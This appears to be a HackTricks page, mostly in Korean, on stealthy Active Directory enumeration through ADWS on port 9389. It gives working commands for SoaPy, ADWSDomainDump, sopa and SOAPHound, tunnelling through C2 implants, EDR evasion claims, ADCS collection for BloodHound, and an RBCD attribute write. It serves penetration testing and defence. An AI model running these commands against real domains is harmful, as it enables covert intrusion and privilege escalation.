# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS란?

Active Directory Web Services (ADWS)는 **Windows Server 2008 R2 이후 모든 Domain Controller에서 기본적으로 활성화되어 있으며** TCP **9389**에서 수신합니다. 이름과 달리 **HTTP는 관여하지 않습니다**. 대신 이 서비스는 LDAP 스타일의 데이터를 독점적인 .NET 프레이밍 프로토콜 스택을 통해 노출합니다:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

이 트래픽은 이진 SOAP 프레임 내부에 캡슐화되어 있고 드문 포트를 통해 전송되기 때문에, **ADWS를 통한 열거는 전통적인 LDAP/389 & 636 트래픽보다 검사, 필터링 또는 시그니처 탐지 대상이 될 가능성이 훨씬 낮습니다**. 운영자 관점에서는 다음과 같은 의미가 있습니다:

* 더 은밀한 정찰 – Blue teams는 종종 LDAP 쿼리에 집중합니다.
* SOCKS 프록시로 9389/TCP를 터널링하여 **non-Windows hosts (Linux, macOS)**에서 수집할 수 있는 자유로움.
* LDAP로 얻을 수 있는 동일한 데이터(사용자, 그룹, ACL, 스키마 등)와 **쓰기** 수행 능력(예: **RBCD**를 위한 `msDs-AllowedToActOnBehalfOfOtherIdentity`).

ADWS 상호작용은 WS-Enumeration 위에서 구현됩니다: 모든 쿼리는 LDAP 필터/속성을 정의하고 `EnumerationContext` GUID를 반환하는 `Enumerate` 메시지로 시작하며, 그다음 서버가 정의한 결과 창까지 스트리밍하는 하나 이상의 `Pull` 메시지가 이어집니다. Context는 대략 30분 후에 만료되므로, 툴은 결과를 페이지화하거나 상태 소실을 피하기 위해 필터를 분할(예: CN별 접두사 쿼리)해야 합니다. 보안 설명자를 요청할 때는 SACL을 생략하기 위해 `LDAP_SERVER_SD_FLAGS_OID` 컨트롤을 지정해야 하며, 지정하지 않으면 ADWS는 SOAP 응답에서 `nTSecurityDescriptor` 속성을 단순히 제거합니다.

> 참고: ADWS는 많은 RSAT GUI/PowerShell 도구에서도 사용되므로 트래픽이 합법적인 관리자 활동과 섞일 수 있습니다.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) 는 **순수 Python으로 ADWS 프로토콜 스택을 완전 재구현한 것**입니다. NBFX/NBFSE/NNS/NMF 프레임을 바이트 단위로 제작하여 .NET 런타임을 건드리지 않고 Unix 계열 시스템에서 수집할 수 있게 합니다.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy는 ADWS를 통해 가장 흔한 LDAP 사냥 작업을 재현하는 엄선된 스위치를 제공합니다: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, 그리고 사용자 정의 풀을 위한 원시 `--query` / `--filter` 조절기. 이를 `--rbcd <source>`( `msDs-AllowedToActOnBehalfOfOtherIdentity` 설정), `--spn <service/cn>`(대상 Kerberoasting을 위한 SPN 스테이징), `--asrep`(`userAccountControl`에서 `DONT_REQ_PREAUTH` 플립) 같은 쓰기 원시와 결합하세요.

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
같은 host/credentials를 사용해 findings를 즉시 weaponise하세요: `--rbcds`로 RBCD-capable 객체를 덤프한 다음 `--rbcd 'WEBSRV01$' --account 'FILE01$'`를 적용해 Resource-Based Constrained Delegation 체인을 스테이징하세요 (전체 악용 경로는 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

### 설치 (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump`의 포크로, LDAP-signature hits를 줄이기 위해 LDAP 쿼리 대신 TCP/9389에서 ADWS 호출을 사용합니다.
* `--force`가 전달되지 않으면 9389에 대한 초기 도달성 검사를 수행합니다 (포트 스캔이 noisy/filtered한 경우 프로브를 건너뜁니다).
* Microsoft Defender for Endpoint와 CrowdStrike Falcon을 대상으로 테스트되었으며 README에 성공적인 우회 사례가 있습니다.

### 설치
```bash
pipx install .
```
### 사용법
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
일반적인 출력은 9389 도달성 확인, ADWS bind, 및 dump 시작/종료를 기록합니다:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

soapy와 마찬가지로, [sopa](https://github.com/Macmod/sopa)는 Golang으로 ADWS 프로토콜 스택(MS-NNS + MC-NMF + SOAP)을 구현하며 다음과 같은 ADWS 호출을 실행할 수 있는 커맨드라인 플래그를 제공합니다:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound)은 모든 LDAP 상호작용을 ADWS 내부에 보관하고 BloodHound v4 호환 JSON을 출력하는 .NET 컬렉터입니다. 한 번 (`--buildcache`) `objectSid`, `objectGUID`, `distinguishedName`, `objectClass`의 완전한 캐시를 구축한 뒤, 이를 재사용하여 대량의 `--bhdump`, `--certdump`(ADCS) 또는 `--dnsdump`(AD-integrated DNS) 작업을 수행하므로 DC에서 외부로 나가는 속성은 약 35개 핵심 속성으로만 제한됩니다. AutoSplit (`--autosplit --threshold <N>`)은 대형 포리스트에서 30분 EnumerationContext 타임아웃을 넘지 않도록 CN 접두사별로 쿼리를 자동으로 샤딩합니다.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
내보낸 JSON은 SharpHound/BloodHound 워크플로우에 직접 삽입할 수 있습니다—하위 그래프 아이디어는 [BloodHound methodology](bloodhound.md)를 참조하세요. AutoSplit은 SOAPHound를 수백만 개 객체 포리스트에서도 견고하게 만들며 쿼리 수를 ADExplorer-style snapshots보다 적게 유지합니다.

## 스텔스 AD 수집 워크플로우

다음 워크플로우는 ADWS를 통해 **domain & ADCS objects**를 열거하고, 이를 BloodHound JSON으로 변환하여 certificate-based 공격 경로를 탐색하는 방법을 보여줍니다 – 모두 Linux에서 수행합니다:

1. **Tunnel 9389/TCP**를 대상 네트워크에서 자신의 머신으로 연결합니다(예: Chisel, Meterpreter, SSH dynamic port-forward 등).  `export HTTPS_PROXY=socks5://127.0.0.1:1080`를 설정하거나 SoaPy의 `--proxyHost/--proxyPort`를 사용하세요.

2. **루트 도메인 객체 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **ADCS 관련 객체를 Configuration NC에서 수집:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound으로 변환:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP 파일 업로드** BloodHound GUI에 ZIP 파일을 업로드하고 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` 같은 cypher 쿼리를 실행하여 인증서 권한 상승 경로(ESC1, ESC8 등)를 확인합니다.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` 쓰기 (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
이를 `s4u2proxy`/`Rubeus /getticket`와 결합하면 전체 **Resource-Based Constrained Delegation** 체인을 완성합니다 (자세한 내용은 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 참조).

## 툴 요약

| 목적 | 도구 | 비고 |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch 로그를 변환 |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | 같은 SOCKS를 통해 프록시 가능 |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | 알려진 ADWS 엔드포인트와 인터페이스하는 일반 클라이언트 — 열거, 객체 생성, 속성 수정, 비밀번호 변경 허용 |

## 참조

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
